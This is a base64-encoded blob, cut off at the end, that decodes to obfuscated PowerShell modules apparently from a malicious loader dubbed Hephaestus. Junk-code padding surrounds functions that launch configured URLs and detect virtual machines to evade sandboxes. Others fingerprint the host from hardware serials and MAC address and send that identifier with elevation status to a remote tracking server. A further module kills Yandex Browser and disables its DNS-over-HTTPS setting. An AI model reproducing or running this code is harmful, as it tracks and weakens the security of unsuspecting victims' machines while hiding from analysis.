IHdyaXRlZGJnMiAncFg5UEV0TU9DalJrdjNsJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ2xRTjNTcEk3RHZyZnk4WicNCn0NCmlmICgkdmFyX0g0U1B2aDM4VnkgLWd0IDMpIHsNCiAgICB3cml0ZWRiZzIgJ2RaaFFTRU53MEZJNVZKWCcNCn0gZWxzZSB7DQogICAgd3JpdGVkYmcyICdpejA2ZXdRQUx1RTRGaEQnDQp9DQokdmFyX2tmNTZjWXZHVG0gPSBmbl81eW9ncERVZU9LIC1wYXJhbTEgNzQgLXBhcmFtMiA0MA0Kd3JpdGVkYmcyICcxRU9YNXFNYklKQVZIZzcnDQokdmFyX0g0U1B2aDM4VnkgPSBmbl9Xbmg2SEtxVlRkIC1wYXJhbTEgNDAgLXBhcmFtMiA3Nw0Kd3JpdGVkYmcyICdqRXdNSjIxaTV0T1dUdU4nDQokdmFyX2tmNTZjWXZHVG0gPSBmbl9Xbmg2SEtxVlRkIC1wYXJhbTEgNjMgLXBhcmFtMiAyMQ0Kd3JpdGVkYmcyICd3NnltQldOOVBRVGxTQVgnDQokdmFyX2tmNTZjWXZHVG0gPSBmbl81eW9ncERVZU9LIC1wYXJhbTEgNzkgLXBhcmFtMiAzNQ0Kd3JpdGVkYmcyICdRZTl0RzQxbVVBZndoMGInDQokdmFyX0g0U1B2aDM4VnkgPSBmbl9Xbmg2SEtxVlRkIC1wYXJhbTEgODQgLXBhcmFtMiAyNw0Kd3JpdGVkYmcyICdRb0JtcklKWnpLeVdzcDUnDQogCgojIHN0YXJ0dXJscy5wczEKCgoKDQoKCg0KDQoNCg0KZnVuY3Rpb24gZG9fc3RhcnR1cmxzIHsNCiAgICAkYXV0byA9IFRlc3QtQXV0b3N0YXJ0Ow0KICAgIGlmICgkc2VydmVyLnN0YXJ0VXJsc0ZvcmNlIC1uZSAkZmFsc2UgLWFuZCAkYXV0byAtZXEgJHRydWUpDQogICAgew0KICAgICAgICB3cml0ZWRiZyAiU2tpcHBpbmcgZnVuY3Rpb24gRG9TdGFydFVybHMiDQogICAgICAgIHJldHVybg0KICAgIH0NCiAgICB0cnkNCiAgICAgICAgew0KICAgICAgICBmb3JlYWNoICgkc3RhcnRVcmwgaW4gJHNlcnZlci5zdGFydFVybHMpIHsNCiAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgJHN0YXJ0VXJsLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoDQogICAgew0KICAgICAgd3JpdGVkYmcgIkFuIGVycm9yIG9jY3VycmVkIChTdGFydCBVcmxzKTogJF8iDQogICAgfQ0KfQ0KZnVuY3Rpb24gZm5fTG9nXzA5bE1iakhFUjQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQ0KICAgICkNCiAgICB3cml0ZWRiZzIgJ0xvZzogJG1lc3NhZ2UnDQp9DQpmdW5jdGlvbiBmbl9neFhXNHlKbWlMIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtpbnRdJHZhcl9VbnJjQXB3RkJ2LA0KICAgICAgICBbaW50XSR2YXJfUkxhWnFXRU45WQ0KICAgICkNCiAgICAkcmVzdWx0ID0gJHZhcl9VbnJjQXB3RkJ2ICsgJHZhcl9STGFacVdFTjlZDQogICAgcmV0dXJuICRyZXN1bHQNCn0NCmZ1bmN0aW9uIGZuX25tVGZLT2VYY0ogew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX1JMYVpxV0VOOVksDQogICAgICAgIFtpbnRdJHZhcl9VbnJjQXB3RkJ2DQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX1JMYVpxV0VOOVkgKyAkdmFyX1VucmNBcHdGQnYNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KaWYgKCR2YXJfVW5yY0Fwd0ZCdiAtZ3QgMykgew0KICAgIHdyaXRlZGJnMiAnbzdRTTNSMFV6WEF5MkZpJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ21hZ1RpRFB3NU9BYzB4aCcNCn0NCmlmICgkdmFyX1JMYVpxV0VOOVkgLWd0IDQpIHsNCiAgICB3cml0ZWRiZzIgJzN5NWlseEM5ZFFCRTJSNycNCn0gZWxzZSB7DQogICAgd3JpdGVkYmcyICdQU2dudU5tQ0RCaTNldksnDQp9DQokdmFyX1VucmNBcHdGQnYgPSBmbl9neFhXNHlKbWlMIC1wYXJhbTEgODggLXBhcmFtMiA0OA0Kd3JpdGVkYmcyICd1YjZFYTVsSEQ0eGloUnEnDQokdmFyX1JMYVpxV0VOOVkgPSBmbl9ubVRmS09lWGNKIC1wYXJhbTEgODUgLXBhcmFtMiA5Nw0Kd3JpdGVkYmcyICd4aVRLRFlXejJIQVpWU0UnDQokdmFyX1JMYVpxV0VOOVkgPSBmbl9ubVRmS09lWGNKIC1wYXJhbTEgMzkgLXBhcmFtMiA0Mw0Kd3JpdGVkYmcyICdGZVJDa0gzR3VhN1h6ODEnDQokdmFyX1JMYVpxV0VOOVkgPSBmbl9ubVRmS09lWGNKIC1wYXJhbTEgMTkgLXBhcmFtMiAxDQp3cml0ZWRiZzIgJ3V6R1BKSGxlajhhNHRkaScNCiR2YXJfVW5yY0Fwd0ZCdiA9IGZuX2d4WFc0eUptaUwgLXBhcmFtMSAzNiAtcGFyYW0yIDM4DQp3cml0ZWRiZzIgJ3h6bnFYT1VXU2JrTkRJdicNCiAKCiMgdHJhY2tlci5wczEKCgoKDQoKCg0KDQpmdW5jdGlvbiBJcy1WaXJ0dWFsTWFjaGluZSB7DQogICAgIyBHZXQgV2luMzJfQ29tcHV0ZXJTeXN0ZW0gaW5mb3JtYXRpb24NCiAgICAkY29tcHV0ZXJTeXN0ZW0gPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbQ0KICAgICRpc1ZpcnR1YWwgPSAkZmFsc2UNCg0KICAgICMgQ2hlY2sgZm9yIGNvbW1vbiB2aXJ0dWFsaXphdGlvbiBtYW51ZmFjdHVyZXJzDQogICAgJHZtTWFudWZhY3R1cmVycyA9IEAoDQogICAgICAgICJNaWNyb3NvZnQgQ29ycG9yYXRpb24iLCAgICMgSHlwZXItVg0KICAgICAgICAiVk13YXJlLCBJbmMuIiwgICAgICAgICAgICAjIFZNd2FyZQ0KICAgICAgICAiWGVuIiwgICAgICAgICAgICAgICAgICAgICAjIFhlbg0KICAgICAgICAiWGVuU291cmNlLCBJbmMuIiwgICAgICAgICAjIFhlblNvdXJjZQ0KICAgICAgICAiaW5ub3RlayBHbWJIIiwgICAgICAgICAgICAjIFZpcnR1YWxCb3gNCiAgICAgICAgIk9yYWNsZSBDb3Jwb3JhdGlvbiIsICAgICAgIyBWaXJ0dWFsQm94DQogICAgICAgICJQYXJhbGxlbHMgU29mdHdhcmUgSW50ZXJuYXRpb25hbCBJbmMuIiwgIyBQYXJhbGxlbHMNCiAgICAgICAgIlFFTVUiLCAgICAgICAgICAgICAgICAgICAgIyBRRU1VDQogICAgICAgICJSZWQgSGF0LCBJbmMuIiwgICAgICAgICAgICMgS1ZNDQogICAgICAgICJBbWF6b24gRUMyIiwgICAgICAgICAgICAgICMgQVdTIEVDMg0KICAgICAgICAiR29vZ2xlIiwgICAgICAgICAgICAgICAgICAjIEdvb2dsZSBDbG91ZCBQbGF0Zm9ybQ0KICAgICAgICAiVmlydHVvenpvIiwgICAgICAgICAgICAgICAjIFZpcnR1b3p6bw0KICAgICAgICAiRGlnaXRhbE9jZWFuIiAgICAgICAgICAgICAjIERpZ2l0YWxPY2Vhbg0KICAgICkNCg0KICAgICMgQ2hlY2sgTWFudWZhY3R1cmVyIGFuZCBNb2RlbCBmb3Igc2lnbnMgb2YgdmlydHVhbGl6YXRpb24NCiAgICBpZiAoJHZtTWFudWZhY3R1cmVycyAtY29udGFpbnMgJGNvbXB1dGVyU3lzdGVtLk1hbnVmYWN0dXJlcikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9IGVsc2VpZiAoJGNvbXB1dGVyU3lzdGVtLk1vZGVsIC1tYXRjaCAiVmlydHVhbHxWTXxWQk9YfEtWTXxRRU1VfFBhcmFsbGVsc3xYZW4iKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgICMgQWRkaXRpb25hbCBjaGVja3MgZm9yIHZpcnR1YWxpemF0aW9uIHVzaW5nIFdpbjMyX0JJT1MNCiAgICAkYmlvcyA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0JJT1MNCiAgICBpZiAoJGJpb3MuU2VyaWFsTnVtYmVyIC1tYXRjaCAiVk13YXJlfFZCT1h8VmlydHVhbHxYZW58UUVNVXxQYXJhbGxlbHMiKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgICMgQWRkaXRpb25hbCBjaGVja3MgdXNpbmcgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0DQogICAgJGNvbXB1dGVyU3lzdGVtUHJvZHVjdCA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdA0KICAgIGlmICgkY29tcHV0ZXJTeXN0ZW1Qcm9kdWN0LlZlcnNpb24gLW1hdGNoICJWaXJ0dWFsfFZNfFZCT1h8S1ZNfFFFTVV8UGFyYWxsZWxzfFhlbiIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgIyBBZGRpdGlvbmFsIHJlZ2lzdHJ5IGNoZWNrIGZvciBQYXJhbGxlbHMNCiAgICAkcGFyYWxsZWxzS2V5ID0gIkhLTE06XFNPRlRXQVJFXFBhcmFsbGVsc1xQYXJhbGxlbHMgVG9vbHMiDQogICAgaWYgKFRlc3QtUGF0aCAkcGFyYWxsZWxzS2V5KSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgIHJldHVybiAkaXNWaXJ0dWFsDQp9DQoNCg0KZnVuY3Rpb24gR2V0LU1hY2hpbmVIYXNoQ29kZSB7DQogICAgIyBHZXQgQklPUyBTZXJpYWwgTnVtYmVyDQogICAgJGJpb3NTZXJpYWwgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9CSU9TKS5TZXJpYWxOdW1iZXINCg0KICAgICMgR2V0IE1vdGhlcmJvYXJkIFNlcmlhbCBOdW1iZXINCiAgICAkbWJTZXJpYWwgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9CYXNlQm9hcmQpLlNlcmlhbE51bWJlcg0KDQogICAgIyBHZXQgTUFDIEFkZHJlc3Mgb2YgdGhlIGZpcnN0IG5ldHdvcmsgYWRhcHRlcg0KICAgICRtYWNBZGRyZXNzID0gKEdldC1XbWlPYmplY3QgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIHwgV2hlcmUtT2JqZWN0IHsgJF8uTUFDQWRkcmVzcyAtYW5kICRfLklQRW5hYmxlZCB9KS5NQUNBZGRyZXNzWzBdDQoNCiAgICAjIENvbWJpbmUgdGhlIGhhcmR3YXJlIGlkZW50aWZpZXJzIGludG8gYSBzaW5nbGUgc3RyaW5nDQogICAgJGNvbWJpbmVkU3RyaW5nID0gIiRiaW9zU2VyaWFsJG1iU2VyaWFsJG1hY0FkZHJlc3MiDQoNCiAgICAjIENvbXB1dGUgdGhlIGhhc2ggY29kZSB1c2luZyBTSEEyNTYNCiAgICAkc2hhMjU2ID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRjb21iaW5lZFN0cmluZykNCiAgICAkaGFzaEJ5dGVzID0gJHNoYTI1Ni5Db21wdXRlSGFzaCgkYnl0ZXMpDQogICAgJGhhc2hTdHJpbmcgPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hCeXRlcykgLXJlcGxhY2UgIi0iLCAiIg0KDQogICAgcmV0dXJuICRoYXNoU3RyaW5nDQp9DQoNCg0KZnVuY3Rpb24gR2VuZXJhdGUtSGFzaCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRkYXRhLA0KICAgICAgICBbc3RyaW5nXSRrZXkNCiAgICApDQoNCiAgICAka2V5Qnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRrZXkpDQogICAgJGRhdGFCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGRhdGEpDQogICAgDQogICAgJGhtYWMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuSE1BQ1NIQTI1Ng0KICAgICRobWFjLktleSA9ICRrZXlCeXRlcw0KICAgICRoYXNoQnl0ZXMgPSAkaG1hYy5Db21wdXRlSGFzaCgkZGF0YUJ5dGVzKQ0KICAgIA0KICAgIHJldHVybiBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRoYXNoQnl0ZXMpDQp9DQoNCmZ1bmN0aW9uIFdyaXRlLVN0cmluZ1RvRmlsZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRGaWxlTmFtZSwNCiAgICAgICAgW3N0cmluZ10kQ29udGVudA0KICAgICkNCiAgICANCiAgICAjIEdldCB0aGUgcGF0aCB0byB0aGUgZGVza3RvcA0KICAgICREZXNrdG9wUGF0aCA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdEZXNrdG9wJykNCiAgICANCiAgICAjIENyZWF0ZSB0aGUgZnVsbCBwYXRoIHRvIHRoZSBmaWxlDQogICAgJEZpbGVQYXRoID0gSm9pbi1QYXRoIC1QYXRoICREZXNrdG9wUGF0aCAtQ2hpbGRQYXRoICRGaWxlTmFtZQ0KICAgIA0KICAgICMgV3JpdGUgdGhlIGNvbnRlbnQgdG8gdGhlIGZpbGUsIGNyZWF0aW5nIG9yIG92ZXJ3cml0aW5nIGl0DQogICAgU2V0LUNvbnRlbnQgLVBhdGggJEZpbGVQYXRoIC1WYWx1ZSAkQ29udGVudA0KfQ0KDQpmdW5jdGlvbiBHZXRTZXJpZSgpDQp7DQogICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxIZXBoYWVzdHVzIg0KICAgICRrZXlOYW1lID0gInNlcmllIg0KICAgICRuZXdWYWx1ZSA9ICRzZXJ2ZXIudHJhY2tTZXJpZS5Ub1N0cmluZygpOw0KDQogICAgaWYgKFRlc3QtUGF0aCAkcmVnaXN0cnlQYXRoKSB7DQogICAgICAgICRrZXlWYWx1ZSA9IEdldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAka2V5TmFtZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5ICRrZXlOYW1lDQogICAgICAgIGlmICgka2V5VmFsdWUgLWFuZCAka2V5VmFsdWUgLW5lICIiKSB7DQogICAgICAgICAgICByZXR1cm4gJGtleVZhbHVlDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLVZhbHVlICRuZXdWYWx1ZQ0KICAgICAgICAgICAgcmV0dXJuICRuZXdWYWx1ZQ0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgTmV3LUl0ZW0gLVBhdGggJHJlZ2lzdHJ5UGF0aCAtRm9yY2UgfCBPdXQtTnVsbA0KICAgICAgICBOZXctSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGtleU5hbWUgLVZhbHVlICRuZXdWYWx1ZSAtUHJvcGVydHlUeXBlIFN0cmluZyB8IE91dC1OdWxsDQogICAgICAgIHJldHVybiAkbmV3VmFsdWUNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldFRpbWVEaWYoKQ0Kew0KICAgICRyZWdpc3RyeVBhdGggPSAiSEtDVTpcU29mdHdhcmVcSGVwaGFlc3R1cyINCiAgICAka2V5TmFtZSA9ICJ0aW1lRGlmIg0KICAgICR0aW1lRGlmPTA7DQoNCiAgICBpZiAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgJGtleVZhbHVlID0gR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1OYW1lICRrZXlOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgJGtleU5hbWUNCiAgICAgICAgaWYgKCRrZXlWYWx1ZSAtYW5kICRrZXlWYWx1ZSAtbmUgIiIpIHsNCiAgICAgICAgICAgICR0aW1lRGlmID0gJGtleVZhbHVlDQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKCR0aW1lRGlmIC1hcyBbaW50XSkgew0KICAgICAgICAkdGltZURpZiA9IFtpbnRdJHRpbWVEaWYNCiAgICB9IGVsc2Ugew0KICAgICAgICAkdGltZURpZj0gMA0KICAgIH0NCiAgICByZXR1cm4gJHRpbWVEaWYNCn0NCg0KZnVuY3Rpb24gZG9fdHJhY2tlciB7DQogICAgaWYgKCRzZXJ2ZXIudHJhY2sgLWVxICRmYWxzZSl7DQogICAgICAgIHJldHVybg0KICAgIH0NCg0KICAgICRpc1ZNID0gSXMtVmlydHVhbE1hY2hpbmUNCiAgICBpZiAoJGlzVk0gLWVxICR0cnVlKXsNCiAgICAgICAgcmV0dXJuDQogICAgfQ0KDQogICAgJGVsZXZhdGVkID0gMA0KICAgIGlmIChJc0VsZXZhdGVkKQ0KICAgIHsNCiAgICAgICAgJGVsZXZhdGVkPTE7DQogICAgfQ0KDQogICAgJGlkID0gR2V0LU1hY2hpbmVIYXNoQ29kZQ0KDQogICAgJGJvZHkgPSAie2AiaWRgIjpgIiQoJGlkLlRvU3RyaW5nKCkpYCIsYCJzZXJpZWAiOmAiJChHZXRTZXJpZSlgIixgIm51bWJlcmAiOmAiJCgkaWQuVG9TdHJpbmcoKSlgIixgImVsZXZhdGVkX251bWJlcmAiOiQoJGVsZXZhdGVkKSxgInRpbWVEaWZgIjokKEdldFRpbWVEaWYpfSINCg0KDQogICAgIyBTZWNyZXQga2V5IChzaGFyZWQgd2l0aCB0aGUgc2VydmVyKQ0KICAgICRzZWNyZXRLZXkgPSAiWW91clNlY3JldEtleUhlcmUiDQoNCiAgICAkdXJsPSAkc2VydmVyLnRyYWNrVXJsDQogIA0KICAgICMgR2VuZXJhdGUgdGhlIGhhc2ggZm9yIHRoZSBKU09OIHJlcXVlc3QgYm9keQ0KICAgICRoYXNoID0gR2VuZXJhdGUtSGFzaCAtZGF0YSAkYm9keSAta2V5ICRzZWNyZXRLZXkNCg0KICAgICMgUHJlcGFyZSBoZWFkZXJzDQogICAgJGhlYWRlcnMgPSBAew0KICAgICAgICAiWC1TaWduYXR1cmUiID0gJGhhc2gNCiAgICAgICAgIkNvbnRlbnQtVHlwZSIgPSAiYXBwbGljYXRpb24vanNvbiINCiAgICAgICAgIlVzZXItQWdlbnQiICA9ICJQb3dlclNoZWxsLzcuMiIgICMgVXNlIHRoZSBVc2VyLUFnZW50IGZyb20gUG9zdG1hbiBpZiBrbm93bg0KICAgIH0NCg0KICAgICR0aW1lb3V0ID0gW2RhdGV0aW1lXTo6VXRjTm93LkFkZE1pbnV0ZXMoMSkNCiAgICAkZGVsYXkgPSA1DQoNCiAgICANCiAgICB3aGlsZSAoW2RhdGV0aW1lXTo6VXRjTm93IC1sdCAkdGltZW91dCkgDQogICAgew0KICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtSGVhZGVycyAkaGVhZGVycyAtTWV0aG9kICJQT1NUIiAtQm9keSAkYm9keSAtVXJpICR1cmwgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04Ig0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggW1N5c3RlbS5OZXQuV2ViRXhjZXB0aW9uXSB7DQogICAgICAgICAgICAgICAgJHN0YXR1c0NvZGUgPSAkXy5FeGNlcHRpb24uUmVzcG9uc2UuU3RhdHVzQ29kZQ0KICAgICAgICAgICAgICAgICRyZXNwU3RyZWFtID0gJF8uRXhjZXB0aW9uLlJlc3BvbnNlLkdldFJlc3BvbnNlU3RyZWFtKCkNCiAgICAgICAgICAgICAgICAkcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKCRyZXNwU3RyZWFtKQ0KICAgICAgICAgICAgICAgICRyZWFkZXIuQmFzZVN0cmVhbS5Qb3NpdGlvbiA9IDANCiAgICAgICAgICAgICAgICAkcmVzcG9uc2VCb2R5ID0gJHJlYWRlci5SZWFkVG9FbmQoKSB8IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG1ha2luZyByZXF1ZXN0OiAkcmVzcG9uc2VCb2R5Ig0KICAgICAgICAgICAgDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaHsNCiAgICAgICAgICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG1ha2luZyByZXF1ZXN0OiAkXyINCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGRlbGF5DQogICAgfQ0KDQogICAgaWYgKCRzZXJ2ZXIudHJhY2tEZXNrdG9wIC1lcSAkdHJ1ZSl7DQogICAgICAgIFdyaXRlLVN0cmluZ1RvRmlsZSAtRmlsZU5hbWUgIiQoJHNlcnZlci50cmFja1NlcmllKS50eHQiIC1Db250ZW50ICRpZA0KICAgIH0NCg0KfQ0KDQpkb190cmFja2VyDQpmdW5jdGlvbiBmbl9Mb2dfTkp6QUl2NzV1ZiB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX2JsdXdVbzVoWlYgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyXzFubFZ3VHBEWTYsDQogICAgICAgIFtpbnRdJHZhcl9rMHlCaG5kT0RSDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyXzFubFZ3VHBEWTYgKyAkdmFyX2sweUJobmRPRFINCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fZFlQMHVDcnA2ZyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfazB5QmhuZE9EUiwNCiAgICAgICAgW2ludF0kdmFyXzFubFZ3VHBEWTYNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfazB5QmhuZE9EUiArICR2YXJfMW5sVndUcERZNg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl8xbmxWd1RwRFk2IC1ndCAyKSB7DQogICAgd3JpdGVkYmcyICdPZWlneDVBeXZ1Vm5EYksnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnNVNBRWVjWXZOSWlSeDliJw0KfQ0KaWYgKCR2YXJfazB5QmhuZE9EUiAtZ3QgMykgew0KICAgIHdyaXRlZGJnMiAnM1RydzZzakZpSjR6NUVxJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJ3NlSXF5Y080bVpQeGQxVCcNCn0NCiR2YXJfMW5sVndUcERZNiA9IGZuX2JsdXdVbzVoWlYgLXBhcmFtMSAyMiAtcGFyYW0yIDc5DQp3cml0ZWRiZzIgJ3RROTFXYTNrbzR1U0RZQycNCiR2YXJfazB5QmhuZE9EUiA9IGZuX2RZUDB1Q3JwNmcgLXBhcmFtMSAyNiAtcGFyYW0yIDYyDQp3cml0ZWRiZzIgJ2FCcldzTTJmS0QxM1JObycNCiR2YXJfazB5QmhuZE9EUiA9IGZuX2JsdXdVbzVoWlYgLXBhcmFtMSAyNyAtcGFyYW0yIDU3DQp3cml0ZWRiZzIgJ2NSdVhkR3g4UXJqdzlKbicNCiR2YXJfMW5sVndUcERZNiA9IGZuX2JsdXdVbzVoWlYgLXBhcmFtMSA5NCAtcGFyYW0yIDg5DQp3cml0ZWRiZzIgJ2xKdENtWHdkOVlQVnBORScNCiR2YXJfazB5QmhuZE9EUiA9IGZuX2JsdXdVbzVoWlYgLXBhcmFtMSA5MCAtcGFyYW0yIDM5DQp3cml0ZWRiZzIgJ1p4WGVCbTFsdmo3Vk9maycNCiAKCiMgeWFuZGV4LnBzMQoKCgoNCgoKDQoNCmZ1bmN0aW9uIGRvX3lhbmRleA0Kew0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdzZXJ2aWNlX3VwZGF0ZS5leGUnLCdicm93c2VyLmV4ZScpKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICdZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGUnDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgLUZpbGVQYXRoICRwYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG9jY3VycmVkOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCiAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKCRudWxsIC1lcSAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtb3IgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLWlzbm90IFtvYmplY3RdKSB7DQogICAgICAgICRjb250ZW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ2Ruc19vdmVyX2h0dHBzJyAtVmFsdWUgQHsNCiAgICAgICAgICAgICdtb2RlJyA9ICdvZmYnDQogICAgICAgICAgICAndGVtcGxhdGVzJyA9ICIiDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5tb2RlID0gJ29mZicNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMudGVtcGxhdGVzID0gIiINCiAgICB9DQoNCiAgICAkanNvblN0cmluZyA9ICRjb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVZhbHVlICRqc29uU3RyaW5nIC1FbmNvZGluZyBVVEY4IC1Gb3JjZQ0KDQogICAgd3JpdGVkYmcgIlN1Y2Nlc3NmdWxseSBjb25maWd1cmVkIFlhbmRleCBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQpmdW5jdGlvbiBmbl9Mb2dfRjJNWDgwcm9aeSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX1dzdFRCSExiWXEgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX3ViRG02Z1c3cVIsDQogICAgICAgIFtpbnRdJHZhcl9TdlRtZzgySjdODQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX3ViRG02Z1c3cVIgKyAkdmFyX1N2VG1nODJKN04NCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5fbEZ0RW9VS0w5eSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfU3ZUbWc4Mko3TiwNCiAgICAgICAgW2ludF0kdmFyX3ViRG02Z1c3cVINCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfU3ZUbWc4Mko3TiArICR2YXJfdWJEbTZnVzdxUg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl91YkRtNmdXN3FSIC1ndCAyKSB7DQogICAgd3JpdGVkYmcyICcwbjlFUldwazJVWmNZaHYnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnRHFnd0tvaWtwWnVHN1dDJw0KfQ0KaWYgKCR2YXJfU3ZUbWc4Mko3T